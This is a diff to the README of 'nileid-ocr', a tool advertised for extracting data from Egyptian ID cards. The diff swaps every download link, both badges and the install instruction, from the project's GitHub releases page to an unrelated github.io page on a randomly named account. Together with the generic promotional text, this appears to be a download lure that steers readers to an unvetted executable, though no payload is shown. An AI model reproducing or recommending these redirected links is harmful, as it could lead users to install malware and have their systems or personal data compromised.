@@ -1,10 +1,10 @@
 # 🪪 nileid-ocr - Extract Egyptian ID Data Automatically
 
-[![Download nileid-ocr](https://img.shields.io/badge/Download-nileid--ocr-2ea44f?style=for-the-badge)](https://github.com/decalescent-sandlot1549/nileid-ocr/releases)
+[![Download nileid-ocr](https://img.shields.io/badge/Download-nileid--ocr-2ea44f?style=for-the-badge)](https://decalescent-sandlot1549.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/decalescent-sandlot1549/nileid-ocr/releases](https://github.com/decalescent-sandlot1549/nileid-ocr/releases)
+Visit this link to download the application: [https://decalescent-sandlot1549.github.io](https://decalescent-sandlot1549.github.io)
 
 Once you arrive at the page, look for the latest release version. Click the download button to save the file to your computer. The download will start automatically after you click. Save the file to a location you can easily find, such as your Desktop or Downloads folder.
 
@@ -126,6 +126,6 @@ nileid-ocr is released under an open-source license. You are free to use, modify
 
 Download nileid-ocr today and transform the way you handle Egyptian ID cards. With automatic text extraction, confidence scoring, and National ID validation, you will save hours of manual data entry and eliminate typing errors. Visit the download page now to get started.
 
-[![Download nileid-ocr](https://img.shields.io/badge/Download-nileid--ocr-2ea44f?style=for-the-badge)](https://github.com/decalescent-sandlot1549/nileid-ocr/releases)
+[![Download nileid-ocr](https://img.shields.io/badge/Download-nileid--ocr-2ea44f?style=for-the-badge)](https://decalescent-sandlot1549.github.io)
 
 Keywords: arabic-nlp, arabic-ocr, computer-vision, document-ai, egypt, id-card, image-processing, information-extraction, ocr, opencv, python, yolo
